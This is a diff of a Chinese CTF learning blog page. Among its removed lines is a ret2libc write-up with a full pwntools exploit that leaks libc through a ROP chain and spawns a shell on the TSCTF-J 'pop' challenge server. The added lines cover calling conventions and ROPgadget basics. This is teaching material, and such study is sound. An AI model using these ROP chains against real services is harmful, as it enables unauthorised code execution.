@@ -3,12 +3,11 @@
 <head>
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width">
-<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
-<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
 
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/qsc.jpg">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/qsc.jpg">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
   <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
 <link rel="stylesheet" href="/css/main.css">
@@ -18,30 +17,30 @@
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
-<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.25.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"foundation","dark":"foundation"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+<script class="next-config" data-name="main" type="application/json">{"hostname":"qinsca.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.25.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
 
-    <meta name="description" content="ret2libic 如果程序中没有system函数，在libc里找到system，使用输出libc其中的函数地址，从而计算基地址，来利用libc中的system(“&#x2F;bin&#x2F;sh”)  实现步骤">
+    <meta name="description" content="函数传参函数调用约定_cdecl：c&#x2F;c++默认方式，参数从右入左，主调函数负责栈平衡_stdcall：windows API默认方式，参数从右向左入栈，被调函数负责栈平衡_fastcall：快速调用。参数优先从寄存器存入（ECX和EDX），剩下的参数再从右向左从栈传入。存取方式快于内存">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwn学习记录（其三）">
-<meta property="og:url" content="http://example.com/posts/d05aad03/">
+<meta property="og:title" content="pwn学习记录（其二）">
+<meta property="og:url" content="https://qinsca.github.io/posts/d05aad03/">
 <meta property="og:site_name" content="qsc">
-<meta property="og:description" content="ret2libic 如果程序中没有system函数，在libc里找到system，使用输出libc其中的函数地址，从而计算基地址，来利用libc中的system(“&#x2F;bin&#x2F;sh”)  实现步骤">
+<meta property="og:description" content="函数传参函数调用约定_cdecl：c&#x2F;c++默认方式，参数从右入左，主调函数负责栈平衡_stdcall：windows API默认方式，参数从右向左入栈，被调函数负责栈平衡_fastcall：快速调用。参数优先从寄存器存入（ECX和EDX），剩下的参数再从右向左从栈传入。存取方式快于内存">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2025-11-08T16:00:00.000Z">
-<meta property="article:modified_time" content="2025-11-11T07:54:25.100Z">
+<meta property="article:published_time" content="2025-11-04T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-11-09T02:54:57.245Z">
 <meta property="article:author" content="qsc">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
 
 
-<link rel="canonical" href="http://example.com/posts/d05aad03/">
+<link rel="canonical" href="https://qinsca.github.io/posts/d05aad03/">
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/posts/d05aad03/","path":"posts/d05aad03/","title":"pwn学习记录（其三）"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://qinsca.github.io/posts/d05aad03/","path":"posts/d05aad03/","title":"pwn学习记录（其二）"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>pwn学习记录（其三） | qsc</title>
+<title>pwn学习记录（其二） | qsc</title>
   
 
 
@@ -55,9 +54,7 @@
   <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
 <script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
 
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
-<script src="/js/third-party/search/local-search.js" defer></script>
-
+  
 
 
 
@@ -65,7 +62,6 @@
 
 
   
-  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
 
 
@@ -84,9 +80,6 @@
       <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
   <div class="site-nav-toggle">
     <div class="toggle" aria-label="切换导航栏" role="button">
-        <span class="toggle-line"></span>
-        <span class="toggle-line"></span>
-        <span class="toggle-line"></span>
     </div>
   </div>
 
@@ -102,46 +95,15 @@
 
   <div class="site-nav-right">
     <div class="toggle popup-trigger" aria-label="搜索" role="button">
-        <i class="fa fa-search fa-fw fa-lg"></i>
     </div>
   </div>
 </div>
 
 
 
-<nav class="site-nav">
-  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">7</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">4</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">17</span></a></li>
-      <li class="menu-item menu-item-search">
-        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
-        </a>
-      </li>
-  </ul>
-</nav>
 
 
 
-  <div class="search-pop-overlay">
-    <div class="popup search-popup">
-      <div class="search-header">
-        <span class="search-icon">
-          <i class="fa fa-search"></i>
-        </span>
-        <div class="search-input-container">
-          <input autocomplete="off" autocapitalize="off" maxlength="80"
-                placeholder="搜索..." spellcheck="false"
-                type="search" class="search-input">
-        </div>
-        <span class="popup-btn-close" role="button">
-          <i class="fa fa-times-circle"></i>
-        </span>
-      </div>
-      <div class="search-result-container">
-        <div class="search-result-icon">
-          <i class="fa fa-spinner fa-pulse fa-5x"></i>
-        </div>
-      </div>
-    </div>
-  </div>
 
 </header>
         
@@ -161,14 +123,12 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2libic"><span class="nav-number">1.</span> <span class="nav-text">ret2libic</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E7%8E%B0%E6%AD%A5%E9%AA%A4"><span class="nav-number">1.1.</span> <span class="nav-text">实现步骤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E6%8F%90"><span class="nav-number">1.2.</span> <span class="nav-text">前提</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E6%88%98-%E4%BB%A5TSCTF-J-pop-%E4%B8%BA%E4%BE%8B"><span class="nav-number">1.3.</span> <span class="nav-text">实战(以TSCTF-J pop 为例)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2libc%E5%9F%BA%E5%9D%80"><span class="nav-number">1.3.1.</span> <span class="nav-text">泄露libc基址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%AB%E6%8C%81%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8Csystem-%E2%80%9C-bin-sh%E2%80%9D"><span class="nav-number">1.3.2.</span> <span class="nav-text">劫持程序运行system(“&#x2F;bin&#x2F;sh”)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%98%E6%96%B9wp"><span class="nav-number">1.3.3.</span> <span class="nav-text">官方wp</span></a></li></ol></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82"><span class="nav-number">1.</span> <span class="nav-text">函数传参</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A"><span class="nav-number">1.1.</span> <span class="nav-text">函数调用约定</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#cdecl-c%E8%AF%AD%E8%A8%80%E8%B0%83%E7%94%A8%E6%A0%88"><span class="nav-number">2.</span> <span class="nav-text">_cdecl:c语言调用栈</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2text64%E4%BD%8D%E4%BC%A0%E5%8F%82ROP%E5%9F%BA%E7%A1%80"><span class="nav-number">3.</span> <span class="nav-text">ret2text64位传参ROP基础</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8C%87%E4%BB%A4%E9%9B%86%E6%8B%86%E5%88%86"><span class="nav-number">3.1.</span> <span class="nav-text">指令集拆分</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ROPgadget"><span class="nav-number">3.2.</span> <span class="nav-text">ROPgadget</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2text%E8%BF%9B%E9%98%B6"><span class="nav-number">4.</span> <span class="nav-text">ret2text进阶</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
         <div class="site-overview-wrap sidebar-panel">
           <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="qsc"
-      src="/images/qsc.jpg">
   <p class="site-author-name" itemprop="name">qsc</p>
   <div class="site-description" itemprop="description">记录学习日常</div>
 </div>
@@ -192,21 +152,9 @@
       </div>
   </nav>
 </div>
-  <div class="links-of-author animated">
-      <span class="links-of-author-item">
-        <a href="https://github.com/Qs-C" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Qs-C" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
-      </span>
-      <span class="links-of-author-item">
-        <a href="mailto://1744326850@qq.com" title="E-Mail → mailto:&#x2F;&#x2F;1744326850@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
-      </span>
-  </div>
 
         </div>
       </div>
-        <div class="back-to-top animated" role="button" aria-label="返回顶部">
-          <i class="fa fa-arrow-up"></i>
-          <span>0%</span>
-        </div>
     </div>
 
     
@@ -226,10 +174,10 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/posts/d05aad03/">
+    <link itemprop="mainEntityOfPage" href="https://qinsca.github.io/posts/d05aad03/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/qsc.jpg">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="qsc">
     </span>
 
@@ -239,16 +187,15 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="pwn学习记录（其三） | qsc">
+      <meta itemprop="name" content="pwn学习记录（其二） | qsc">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          pwn学习记录（其三）
+          pwn学习记录（其二）
         </h1>
 
         <div class="post-meta-container">
-
           <div class="post-meta">
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -256,14 +203,14 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2025-11-09 00:00:00" itemprop="dateCreated datePublished" datetime="2025-11-09T00:00:00+08:00">2025-11-09</time>
+      <time title="创建时间：2025-11-05 00:00:00" itemprop="dateCreated datePublished" datetime="2025-11-05T00:00:00+08:00">2025-11-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2025-11-11 15:54:25" itemprop="dateModified" datetime="2025-11-11T15:54:25+08:00">2025-11-11</time>
+      <time title="修改时间：2025-11-09 10:54:57" itemprop="dateModified" datetime="2025-11-09T10:54:57+08:00">2025-11-09</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -276,27 +223,20 @@
     </span>
 
   
-    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
-      <span class="post-meta-item-icon">
-        <i class="far fa-eye"></i>
-      </span>
-      <span class="post-meta-item-text">阅读次数：</span>
-      <span id="busuanzi_value_page_pv"></span>
-    </span>
     <span class="post-meta-break"></span>
     <span class="post-meta-item" title="本文字数">
       <span class="post-meta-item-icon">
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>2.2k</span>
+      <span>631</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>4 分钟</span>
+      <span>1 分钟</span>
     </span>
 </div>
 
@@ -306,25 +246,37 @@
     
     
     
-    <div class="post-body" itemprop="articleBody"><h1 id="ret2libic"><a href="#ret2libic" class="headerlink" title="ret2libic"></a>ret2libic</h1><blockquote>
-<p>如果程序中没有system函数，在libc里找到system，使用输出libc其中的函数地址，从而计算基地址，来利用libc中的system(“&#x2F;bin&#x2F;sh”)</p>
-</blockquote>
-<h2 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h2><ul>
-<li>找到一个函数的真实地址，使程序打印并回到函数开始的地方</li>
-<li>根据基地址计算函数的偏移地址</li>
-<li>确认system函数和”&#x2F;bin&#x2F;sh”字符串在libc库中的偏移地址<br>*计算真实地址</li>
-<li>劫持程序的执行流程，让程序执行system(“&#x2F;bin&#x2F;sh”)</li>
+    <div class="post-body" itemprop="articleBody"><h1 id="函数传参"><a href="#函数传参" class="headerlink" title="函数传参"></a>函数传参</h1><h2 id="函数调用约定"><a href="#函数调用约定" class="headerlink" title="函数调用约定"></a>函数调用约定</h2><p><strong>_cdecl</strong>：c&#x2F;c++默认方式，参数从右入左，主调函数负责栈平衡<br>_stdcall：windows API默认方式，参数从右向左入栈，被调函数负责栈平衡<br>_fastcall：快速调用。参数优先从寄存器存入（ECX和EDX），剩下的参数再从右向左从栈传入。存取方式快于内存</p>
+<h1 id="cdecl-c语言调用栈"><a href="#cdecl-c语言调用栈" class="headerlink" title="_cdecl:c语言调用栈"></a>_cdecl:c语言调用栈</h1><ul>
+<li>x86<ul>
+<li>用栈来传递函数</li>
+<li>使用eax存放返回值</li>
 </ul>
-<h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><ul>
-<li>全局偏移量表(GOT)<br>全局偏移量表（GOT）是一个在程序的数据段中的表，它存储了程序中所有需要动态链接的函数和变量的地址。当程序第一次调用一个动态链接的函数时，动态链接器会查找该函数在动态链接库中的地址，然后将这个地址存储在GOT表中的相应条目中。这样，当程序再次调用这个函数时，它就可以直接从GOT表中获取这个函数的地址，而不需要再次进行查找。</li>
-<li>程序链接表(PLT)<br>程序链接表（PLT）是一个在程序的代码段中的表，它包含了一系列的跳转指令，这些指令用于跳转到GOT表中的相应条目。当程序需要调用一个动态链接的函数时，它会首先跳转到PLT表中的相应条目，然后通过这个条目跳转到GOT表中的相应条目，最后跳转到这个函数在动态链接库中的实际地址。</li>
-<li>延迟绑定<br>只有动态库libc中的函数在被调用时，才会进行地址解析和重定位工作，也就是说，只有函数发生调用之后，我们才能够通过got表读取到libc中的函数。</li>
-<li>偏移地址<br>libc是Linux系统下的C函数库，其中就会有system()函数、”&#x2F;bin&#x2F;sh”字符串，而libc库中存放的就是这些函数的偏移地址。</li>
-<li>基地址<br>每次运行程序加载函数时，函数的基地址都会发生改变。这是一种地址随机化的保护机制，导致函数的真实地址每次运行都是不一样的。<br>这次运行程序的基地址 &#x3D; 这次运行得到的某个函数func的真实地址  - 函数func的偏移地址</li>
+</li>
+<li>amd64<ul>
+<li>前六个参数依次存放于rdi，rsi，rdx，rcx，r8，r9寄存器中</li>
+<li>第七个以后的参数存放于栈中</li>
 </ul>
-<h2 id="实战-以TSCTF-J-pop-为例"><a href="#实战-以TSCTF-J-pop-为例" class="headerlink" title="实战(以TSCTF-J pop 为例)"></a>实战(以TSCTF-J pop 为例)</h2><h3 id="泄露libc基址"><a href="#泄露libc基址" class="headerlink" title="泄露libc基址"></a>泄露libc基址</h3><p>  vuln &#x3D; 0x400626<br>  pop_rdi_ret &#x3D; 0x0000000000400713<br>  puts_got &#x3D; elf.got[‘puts’]<br>  puts_plt &#x3D; elf.plt[‘puts’]<br>  pl &#x3D; p64(0)*3 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln)<br>  p.sendlineafter(b’time!\n’,pl)<br>选择puts函数，劫持程序打印puts函数的真实地址<br>计算libc的真实地址<code>libc.address = u64(p.recv(6).ljust(8,b&#39;\x00&#39;)) - 0x6f6a0</code></p>
-<h3 id="劫持程序运行system-“-bin-sh”"><a href="#劫持程序运行system-“-bin-sh”" class="headerlink" title="劫持程序运行system(“&#x2F;bin&#x2F;sh”)"></a>劫持程序运行system(“&#x2F;bin&#x2F;sh”)</h3><p>  binsh &#x3D; next(libc.search(b’&#x2F;bin&#x2F;sh’))<br>  system &#x3D; libc.sym[‘system’]<br>  pl &#x3D; p64(0)*3 + p64(pop_rdi_ret) + p64(binsh) + p64(system)<br>  p.sendlineafter(b’time!\n’,pl)<br>获取”bin&#x2F;sh”和system的真实地址，跳回vuln函数开头，执行system(“&#x2F;bin&#x2F;sh”)</p>
-<h3 id="官方wp"><a href="#官方wp" class="headerlink" title="官方wp"></a>官方wp</h3><p>from pwn import *<br>p &#x3D; remote(‘10.21.131.92’,33783)<br>#p &#x3D; remote(‘127.0.0.1’,1337)<br>#p &#x3D; process(‘.&#x2F;pwn’)<br>libc &#x3D; ELF(‘.&#x2F;libc-2.23.so’)<br>elf &#x3D; ELF(‘.&#x2F;pwn’)<br>context(os&#x3D;’linux’,arch&#x3D;’amd64’,log_level&#x3D;’debug’)<br>def exp():<br>    vuln &#x3D; 0x400626<br>    pop_rdi_ret &#x3D; 0x0000000000400713<br>    puts_got &#x3D; elf.got[‘puts’]<br>    puts_plt &#x3D; elf.plt[‘puts’]<br>    pl &#x3D; p64(0)*3 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln)<br>    p.sendlineafter(b’time!\n’,pl)<br>    libc.address &#x3D; u64(p.recv(6).ljust(8,b’\x00’)) - 0x6f6a0<br>    binsh &#x3D; next(libc.search(b’&#x2F;bin&#x2F;sh’))<br>    system &#x3D; libc.sym[‘system’]<br>    pl &#x3D; p64(0)*3 + p64(pop_rdi_ret) + p64(binsh) + p64(system)<br>    p.sendlineafter(b’time!\n’,pl)<br>    log.success(‘libc_base:’+hex(libc.address))<br>    #gdb.attach(p)<br>    p.interactive()<br>if <strong>name</strong> &#x3D;&#x3D; ‘<strong>main</strong>‘:<br>    exp()</p>
+</li>
+</ul>
+<h1 id="ret2text64位传参ROP基础"><a href="#ret2text64位传参ROP基础" class="headerlink" title="ret2text64位传参ROP基础"></a>ret2text64位传参ROP基础</h1><p>如果程序中没有存在代码：</p>
+<pre><code>mov eax,0xb
+mov ebx,[&quot;/bin.sh&quot;]
+mov ecx,0
+mov edx,0
+int 0x80
+//即为execve(&quot;bin/sh&quot;,NULL,NULL)
+</code></pre>
+<p>则需要考虑ROP(Return Oriented Programming)返回导向编程<br>对于能控制RIP的指令有</p>
+<ul>
+<li>JMP</li>
+<li>pop RIP</li>
+<li>ret</li>
+<li>call &#x3D;push rip，jmp</li>
+</ul>
+<h2 id="指令集拆分"><a href="#指令集拆分" class="headerlink" title="指令集拆分"></a>指令集拆分</h2><p>对于寄存器rbp，r12，rbp对应5D，r12对应41 5D，如果返回指令时跳过41，就能将<code>pop r12</code>为<code>pop rbp</code></p>
+<h2 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h2><p>命令<code>ROPgadget --binary a.out</code>和<code>ropper -f a.out</code>能找到可用的gadget</p>
+<h1 id="ret2text进阶"><a href="#ret2text进阶" class="headerlink" title="ret2text进阶"></a>ret2text进阶</h1><p>当读取长度有限时，可参考pwn学习（一）的最后，直接跳到调用函数执行call的地方，使指令简便</p>
 
     </div>
 
@@ -343,7 +295,7 @@
 
     <!-- 粘贴 GISCUS 生成的代码 START -->
     <script src="https://giscus.app/client.js"
-        data-repo="Qs-C/Qs-C.github.io"
+        data-repo="qinsca/qinsca.github.io"
         data-repo-id="R_kgDOQKri3w"
         data-category="Announcements"
         data-category-id="DIC_kwDOQKri384CzWLD"
@@ -371,13 +323,13 @@
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/posts/cf13ee37/" rel="prev" title="随便记点">
-                  <i class="fa fa-angle-left"></i> 随便记点
+                <a href="/posts/e04c41db/" rel="prev" title="pwn学习记录（其一）">
+                  <i class="fa fa-angle-left"></i> pwn学习记录（其一）
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/posts/2a691734/" rel="next" title="pwn学习记录（其四）">
-                  pwn学习记录（其四） <i class="fa fa-angle-right"></i>
+                <a href="/posts/cf13ee37/" rel="next" title="随便记点">
+                  随便记点 <i class="fa fa-angle-right"></i>
                 </a>
             </div>
           </div>
@@ -409,7 +361,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    total words&asymp;<span title="站点总字数">23k</span>
+    <span title="站点总字数">23k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
@@ -418,24 +370,8 @@
     <span title="站点阅读时长">43 分钟</span>
   </span>
 </div>
-<div class="busuanzi-count">
-    <span class="post-meta-item" id="busuanzi_container_site_uv">
-      <span class="post-meta-item-icon">
-        <i class="fa fa-user"></i>
-      </span>
-      <span class="site-uv" title="总访客量">
-        visitors:<span id="busuanzi_value_site_uv"></span>
-      </span>
-    </span>
-    <span class="post-meta-item" id="busuanzi_container_site_pv">
-      <span class="post-meta-item-icon">
-        <i class="fa fa-eye"></i>
-      </span>
-      <span class="site-pv" title="总访问量">
-        views:<span id="busuanzi_value_site_pv"></span>
-      </span>
-    </span>
-</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
 
     </div>
   </footer>
@@ -447,30 +383,14 @@
     <span class="toggle-line"></span>
   </div>
   <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
 
 <noscript>
   <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
 </noscript>
-<script src="https://cdn.jsdelivr.net/npm/darkmode-js@1.5.7/lib/darkmode-js.min.js"></script>
-
-<script>
-var options = {
-  bottom: '64px',
-  right: 'unset',
-  left: '32px',
-  time: '0.5s',
-  mixColor: 'transparent',
-  backgroundColor: 'transparent',
-  buttonColorDark: '#100f2c',
-  buttonColorLight: '#fff',
-  saveInCookies: true,
-  label: '🌓',
-  autoMatchOsTheme: true
-}
-const darkmode = new Darkmode(options);
-window.darkmode = darkmode;
-darkmode.showWidget();
-</script>
 <!-- 罗德岛背景大水印 -->
 <div id="arknights-bg-watermark" style="
     position: fixed;
